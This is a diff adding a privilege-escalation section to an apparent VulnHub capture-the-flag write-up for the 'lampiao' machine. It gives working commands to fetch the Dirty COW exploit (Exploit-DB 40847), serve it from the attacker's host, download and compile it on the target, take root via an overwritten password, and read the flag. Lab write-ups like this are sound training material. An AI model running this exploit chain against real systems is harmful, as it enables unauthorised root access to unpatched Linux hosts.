@@ -133,6 +133,45 @@ yes, we got the shell
 
 ## 4.Privilege Escalation
 
+Now we just check the kernel version and find any exploit for it :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fcf13d1b-a184-48f4-9e75-7b63087a6af7)
+
+
+use `linux-exploit-suggester.sh` to find any exploit for this kernel :
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/593d1aad-9d5a-4ace-a9c6-6666acf43d74)
+
+
+download dirycow 2 exploit and compile it on the server :
+
+```bash
+root@kali: searchsploit -m https://www.exploit-db.com/download/40847
+root@kali: python3 -m http.server 80
+
+www-data@lampiao:/tmp$ wget http://192.168.127.128/40847.cpp
+
+www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o output 40847.cpp -lutil
+www-data@lampiao:/tmp$ ./output
+Running ...
+Received su prompt (Password: )
+Root password is:   dirtyCowFun
+Enjoy! :-)
+
+www-data@lampiao:/tmp$ su root
+su root
+Password: dirtyCowFun
+
+root@lampiao:/tmp# cd /root
+
+root@lampiao:~# cat flag.txt
+cat flag.txt
+9740616875908d91ddcdaa8aea3af366
+```
+
+this is how you can get root on this machine :)
+
+
 
 
 
